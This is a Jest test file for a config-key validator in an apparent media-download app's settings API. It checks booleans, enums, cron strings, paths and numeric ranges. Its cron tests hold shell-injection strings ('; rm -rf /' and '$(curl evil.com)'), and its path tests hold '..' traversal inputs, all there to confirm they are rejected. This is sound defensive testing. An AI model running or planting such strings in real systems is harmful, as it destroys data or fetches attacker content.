/**
 * Regression tests for the config-key validator registry.
 *
 * The settings.set tRPC mutation accepts arbitrary keys with z.unknown() for
 * back-compat with ~30 callers. This registry tightens specific keys —
 * primarily those written from /settings/media-management — so out-of-range
 * numbers, unsafe paths, or malformed cron strings can never reach the Config
 * table.
 *
 * @jest-environment node
 */

import { describe, it, expect } from '@jest/globals';

import { validateConfigKey } from '@/server/trpc/routers/settings/config-key-validators';

describe('validateConfigKey', () => {
  describe('unknown keys', () => {
    it('passes through values for unregistered keys unchanged', () => {
      const value = { arbitrary: 'shape', nested: [1, 2, 3] };
      expect(validateConfigKey('totally.unregistered.key', value)).toBe(value);
    });

    it('does not reject unknown keys (back-compat)', () => {
      expect(() => validateConfigKey('some.legacy.key', 'whatever')).not.toThrow();
    });
  });

  describe('boolean keys (string or native)', () => {
    it('accepts native booleans', () => {
      expect(validateConfigKey('media.enableEbookFormats', true)).toBe(true);
      expect(validateConfigKey('media.enableAudiobooks', false)).toBe(false);
    });

    it('accepts the string "true"/"false" wire format', () => {
      expect(validateConfigKey('media.enableEbookFormats', 'true')).toBe(true);
      expect(validateConfigKey('media.enableAudiobooks', 'false')).toBe(false);
    });

    it('rejects other strings', () => {
      expect(() => validateConfigKey('media.enableEbookFormats', 'yes')).toThrow();
      expect(() => validateConfigKey('media.enableAudiobooks', '1')).toThrow();
    });

    it('rejects numbers and objects', () => {
      expect(() => validateConfigKey('download.autoDownload', 1)).toThrow();
      expect(() => validateConfigKey('download.retry.enabled', {})).toThrow();
    });
  });

  describe('download.interval enum', () => {
    it('accepts the documented values', () => {
      for (const v of ['hourly', 'every2hours', 'every4hours', 'every6hours', 'daily', 'custom']) {
        expect(validateConfigKey('download.interval', v)).toBe(v);
      }
    });

    it('rejects arbitrary strings', () => {
      expect(() => validateConfigKey('download.interval', 'whenever')).toThrow();
    });
  });

  describe('cron expression', () => {
    it('accepts a 5-field cron', () => {
      expect(validateConfigKey('download.customCron', '0 3 * * *')).toBe('0 3 * * *');
      expect(validateConfigKey('download.customCron', '*/15 * * * *')).toBe('*/15 * * * *');
    });

    it('rejects fewer or more fields', () => {
      expect(() => validateConfigKey('download.customCron', '0 3 * *')).toThrow();
      expect(() => validateConfigKey('download.customCron', '0 3 * * * *')).toThrow();
    });

    it('rejects shell-injection attempts', () => {
      expect(() => validateConfigKey('download.customCron', '0 3 * * * ; rm -rf /')).toThrow();
      expect(() => validateConfigKey('download.customCron', '$(curl evil.com)')).toThrow();
    });
  });

  describe('absolute path string', () => {
    it('accepts absolute paths', () => {
      expect(validateConfigKey('download.downloadPath', '/data/downloads')).toBe('/data/downloads');
    });

    it('rejects relative paths', () => {
      expect(() => validateConfigKey('download.downloadPath', 'downloads')).toThrow();
      expect(() => validateConfigKey('download.downloadPath', './downloads')).toThrow();
    });

    it('rejects paths with .. segments', () => {
      expect(() => validateConfigKey('download.downloadPath', '/data/../../etc')).toThrow();
    });
  });

  describe('numeric ranges', () => {
    it('clamps download.retryAttempts to 0-10', () => {
      expect(validateConfigKey('download.retryAttempts', 5)).toBe(5);
      expect(validateConfigKey('download.retryAttempts', 0)).toBe(0);
      expect(validateConfigKey('download.retryAttempts', 10)).toBe(10);
      expect(() => validateConfigKey('download.retryAttempts', -1)).toThrow();
      expect(() => validateConfigKey('download.retryAttempts', 11)).toThrow();
    });

    it('enforces stallTimeoutMinutes 5-120', () => {
      expect(validateConfigKey('download.retry.stallTimeoutMinutes', 30)).toBe(30);
      expect(() => validateConfigKey('download.retry.stallTimeoutMinutes', 4)).toThrow();
      expect(() => validateConfigKey('download.retry.stallTimeoutMinutes', 121)).toThrow();
    });

    it('enforces delayBetweenRetriesSeconds 10-600', () => {
      expect(validateConfigKey('download.retry.delayBetweenRetriesSeconds', 60)).toBe(60);
      expect(() => validateConfigKey('download.retry.delayBetweenRetriesSeconds', 9)).toThrow();
      expect(() => validateConfigKey('download.retry.delayBetweenRetriesSeconds', 601)).toThrow();
    });

    it('rejects non-integer numerics', () => {
      expect(() => validateConfigKey('download.retryAttempts', 5.5)).toThrow();
    });
  });

  describe('fileOrganization JSON blob', () => {
    it('accepts a valid object with whitelisted folderStructure', () => {
      const cfg = {
        folderStructure: 'byTitle',
        libraryBasePath: '/manga',
        volumeNamingTemplate: '{title} Vol {volume}',
        chapterNamingTemplate: '{title} V{volume} C{chapter}',
      };
      expect(validateConfigKey('fileOrganization', cfg)).toEqual(cfg);
    });

    it('accepts a JSON-stringified object (UI wire format)', () => {
      const cfg = { folderStructure: 'flat' as const, libraryBasePath: '/manga' };
      const result = validateConfigKey('fileOrganization', JSON.stringify(cfg));
      expect(result).toEqual(cfg);
    });

    it('rejects unknown folderStructure values', () => {
      expect(() =>
        validateConfigKey('fileOrganization', { folderStructure: 'random' }),
      ).toThrow();
    });

    it('rejects templates with undocumented placeholders', () => {
      expect(() =>
        validateConfigKey('fileOrganization', {
          volumeNamingTemplate: '{title} {undocumented}',
        }),
      ).toThrow();
    });

    it('rejects non-absolute libraryBasePath', () => {
      expect(() =>
        validateConfigKey('fileOrganization', { libraryBasePath: 'manga' }),
      ).toThrow();
    });

    it('rejects libraryBasePath with .. segments', () => {
      expect(() =>
        validateConfigKey('fileOrganization', { libraryBasePath: '/data/../etc' }),
      ).toThrow();
    });

    it('rejects malformed JSON strings', () => {
      expect(() => validateConfigKey('fileOrganization', '{ not valid json }')).toThrow();
    });

    it('rejects extra (unknown) keys via .strict()', () => {
      expect(() =>
        validateConfigKey('fileOrganization', {
          folderStructure: 'byTitle',
          maliciousKey: 'evil',
        }),
      ).toThrow();
    });
  });
});
